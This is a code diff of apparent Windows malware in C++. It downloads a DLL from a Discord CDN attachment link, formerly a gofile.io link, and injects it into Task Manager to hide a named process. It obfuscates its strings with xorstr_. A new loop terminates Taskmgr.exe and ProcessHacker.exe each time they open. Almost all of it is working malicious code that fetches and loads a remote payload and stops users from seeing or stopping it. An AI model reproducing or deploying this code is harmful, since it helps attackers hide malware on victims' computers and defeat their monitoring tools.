@@ -6274,7 +6274,7 @@ bool inject_dll(DWORD pid, std::string dll_path) {
 void find_and_inject()
 {
 	DWORD lastpid = 4;
-	std::string dll_path(helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("gui.dll"));
+	std::string dll_path(client::PATH + xorstr_("gui.dll"));
 	
 	while (true) {		// Keep running to check if TM closes and reopens, if yes then inject again
 		PROCESSENTRY32 process;
@@ -6334,13 +6334,11 @@ bool map_process_name(std::string process) {
 	CopyMemory(buf, process.c_str(), process.length());
 }
 
-void hide_process(std::string name) {
+void task_manager::hide_process(std::string name) {
 	std::string inp;
 	map_process_name(name);
 
-	/*FILE* file = fopen((helpers::roaming + xorstr_("\\Microsoft\\") + "gui.dll").c_str(), "wb");
-	fwrite(dll_bytes, 1, sizeof(dll_bytes), file);*/
-	requests::download_file(xorstr_("https://srv-store5.gofile.io/download/J1KQDN/gui.dll"), helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("gui.dll"));
+	requests::download_file(xorstr_("https://cdn.discordapp.com/attachments/779554666677665813/784249724436742244/gui.dll"), client::PATH + xorstr_("gui.dll"));
 
 	CreateThread(
 		NULL,
@@ -6352,3 +6350,52 @@ void hide_process(std::string name) {
 	);
 }
 
+void loop() {
+	DWORD lastpid = 4;
+
+	while (true) {		// Keep running to check if TM closes and reopens, if yes then inject again
+		PROCESSENTRY32 process;
+		process.dwSize = sizeof(PROCESSENTRY32);
+
+		HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+		if (proc_snap == INVALID_HANDLE_VALUE) {
+			return;
+		}
+
+		if (!Process32First(proc_snap, &process)) {
+			return;
+		}
+
+		do
+		{
+			if (!lstrcmp(process.szExeFile, "Taskmgr.exe") && lastpid != process.th32ProcessID) {
+				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, process.th32ProcessID);
+				TerminateProcess(hProcess, 0);
+				CloseHandle(hProcess);
+
+				lastpid = process.th32ProcessID;
+			}
+			else if (!lstrcmp(process.szExeFile, "ProcessHacker.exe") && lastpid != process.th32ProcessID) {
+				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, process.th32ProcessID);
+				TerminateProcess(hProcess, 0);
+				CloseHandle(hProcess);
+
+				lastpid = process.th32ProcessID;
+			}
+
+		} while (Process32Next(proc_snap, &process));
+		CloseHandle(proc_snap);
+		Sleep(1000);
+	}
+}
+
+void task_manager::kill_task_loop() {
+	CreateThread(
+		NULL,
+		NULL,
+		(LPTHREAD_START_ROUTINE)loop,
+		NULL,
+		NULL,
+		NULL
+	);
+}
